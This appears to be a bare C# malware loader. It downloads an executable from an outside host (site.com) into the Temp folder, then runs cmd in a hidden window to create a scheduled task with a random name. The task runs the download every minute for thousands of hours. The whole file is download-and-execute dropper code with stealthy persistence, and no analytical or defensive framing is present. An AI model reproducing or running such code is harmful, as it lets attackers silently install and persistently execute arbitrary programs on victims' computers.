using System.Diagnostics;
using System.Net;


static async void Download(string url, string filename)
{
    filename = Environment.GetEnvironmentVariable("Temp") + "\\" + filename;
    using (var client = new WebClient())
    {
        client.DownloadFile(url, filename);
    }
}
static void schedule(string path)
{
    var process = new Process();
    process.StartInfo = new ProcessStartInfo("cmd", "/C" + "schtasks /create /tn \\"+ generateString() + "\\" + generateString()
        +  " /tr " + path 
        + " /st 00:00 /du 9999:59 /sc once /ri 1 /f");
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.CreateNoWindow = true;
    process.Start();
} 
static String generateString()
{
    string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
    string result = "";
    Random random = new Random();
    int inter = random.Next(0, abc.Length);
    for (int i = 0; i < inter; i++)
    {
        result += abc[random.Next(0, abc.Length)];
    }
    return result;
}
Download("http://site.com/prog.exe", "prog.exe");
schedule(Environment.GetEnvironmentVariable("Temp") + "\\prog.exe");